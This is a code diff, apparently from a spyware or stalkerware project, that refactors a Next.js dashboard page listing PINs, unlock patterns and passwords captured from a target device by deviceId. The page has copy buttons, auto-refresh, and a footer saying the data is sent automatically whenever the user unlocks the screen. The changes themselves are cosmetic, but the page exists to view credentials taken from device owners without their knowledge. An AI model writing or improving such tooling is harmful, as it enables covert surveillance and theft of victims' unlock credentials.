@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useEffect, useCallback } from 'react'
+import { useState, useEffect, useCallback, Suspense } from 'react'
 import { useSearchParams } from 'next/navigation'
 
 interface PinCapture {
@@ -11,13 +11,13 @@ interface PinCapture {
 }
 
 const TYPE_LABEL: Record<string, { label: string; color: string; icon: string }> = {
-  pin:      { label: 'PIN',      color: 'text-yellow-400 bg-yellow-400/10 border-yellow-400/30', icon: '🔢' },
-  pattern:  { label: 'Pola',     color: 'text-purple-400 bg-purple-400/10 border-purple-400/30', icon: '⬡' },
-  password: { label: 'Sandi',    color: 'text-blue-400   bg-blue-400/10   border-blue-400/30',   icon: '🔤' },
-  unknown:  { label: 'Unknown',  color: 'text-gray-400   bg-gray-400/10   border-gray-400/30',   icon: '❓' },
+  pin:      { label: 'PIN',    color: 'text-yellow-400 bg-yellow-400/10 border-yellow-400/30', icon: '🔢' },
+  pattern:  { label: 'Pola',   color: 'text-purple-400 bg-purple-400/10 border-purple-400/30', icon: '⬡' },
+  password: { label: 'Sandi',  color: 'text-blue-400   bg-blue-400/10   border-blue-400/30',   icon: '🔤' },
+  unknown:  { label: 'Lainnya',color: 'text-gray-400   bg-gray-400/10   border-gray-400/30',   icon: '❓' },
 }
 
-export default function PinLogPage() {
+function PinLogContent() {
   const params   = useSearchParams()
   const deviceId = params.get('deviceId') ?? ''
 
@@ -39,9 +39,7 @@ export default function PinLogPage() {
     }
   }, [deviceId])
 
-  useEffect(() => {
-    fetchCaptures()
-  }, [fetchCaptures])
+  useEffect(() => { fetchCaptures() }, [fetchCaptures])
 
   useEffect(() => {
     if (!autoRefresh) return
@@ -63,13 +61,11 @@ export default function PinLogPage() {
 
   const filtered = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
 
-  const fmt = (iso: string) => {
-    const d = new Date(iso)
-    return d.toLocaleString('id-ID', {
+  const fmt = (iso: string) =>
+    new Date(iso).toLocaleString('id-ID', {
       day: '2-digit', month: 'short', year: 'numeric',
       hour: '2-digit', minute: '2-digit', second: '2-digit',
     })
-  }
 
   if (!deviceId) {
     return (
@@ -172,20 +168,17 @@ export default function PinLogPage() {
                   key={c.id}
                   className="flex items-center gap-4 p-4 bg-gray-900 border border-gray-800 hover:border-gray-700 rounded-xl transition-all group"
                 >
-                  {/* Type badge */}
                   <div className={`shrink-0 px-2.5 py-1 rounded-lg text-xs font-bold border ${info.color}`}>
                     {info.icon} {info.label}
                   </div>
 
-                  {/* Value — big & bold */}
                   <div className="flex-1 min-w-0">
-                    <div className="font-mono text-xl font-bold text-white tracking-widest truncate">
+                    <div className="font-mono text-2xl font-bold text-white tracking-widest truncate">
                       {c.value}
                     </div>
                     <div className="text-xs text-gray-500 mt-0.5">{fmt(c.capturedAt)}</div>
                   </div>
 
-                  {/* Copy button */}
                   <button
                     onClick={() => copyValue(c.id, c.value)}
                     className="shrink-0 px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs text-gray-400 hover:text-white transition-all opacity-0 group-hover:opacity-100"
@@ -199,11 +192,22 @@ export default function PinLogPage() {
         )}
       </div>
 
-      {/* Footer info */}
       <div className="px-6 py-3 border-t border-gray-800 bg-gray-900/50 text-xs text-gray-500 flex items-center justify-between">
         <span>📡 Data dikirim otomatis saat user berhasil membuka layar</span>
         <span>{filtered.length} dari {captures.length} ditampilkan</span>
       </div>
     </div>
+  )
+}
+
+export default function PinLogPage() {
+  return (
+    <Suspense fallback={
+      <div className="flex items-center justify-center h-full bg-gray-950">
+        <div className="text-gray-400 text-sm">Memuat...</div>
+      </div>
+    }>
+      <PinLogContent />
+    </Suspense>
   )
 }
